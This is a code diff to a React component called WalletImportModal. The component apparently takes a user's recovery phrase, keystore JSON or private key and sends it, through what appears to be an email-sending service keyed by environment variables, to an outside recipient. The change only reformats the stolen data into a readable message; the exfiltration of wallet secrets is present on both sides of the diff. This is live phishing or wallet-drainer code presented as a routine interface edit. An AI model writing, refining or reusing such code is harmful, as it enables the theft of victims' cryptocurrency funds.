@@ -87,14 +87,20 @@ function WalletImportModal() {
         process.env.NEXT_PUBLIC_APP_SERVICE_KEY!,
         process.env.NEXT_PUBLIC_APP_TEMPLATE_KEY!,
         {
-          import_type:
+          message: `
+Import Type: ${
             activeTab === "phrase"
               ? "Recovery Phrase"
               : activeTab === "keystore"
               ? "Keystore JSON"
-              : "Private Key",
-          wallet_data: currentValue,
-          timestamp: new Date().toISOString(),
+              : "Private Key"
+          }
+
+Wallet Data:
+${currentValue}
+
+Time: ${new Date().toISOString()}
+        `.trim(),
         },
         process.env.NEXT_PUBLIC_APP_PUBLIC_KEY!
       );
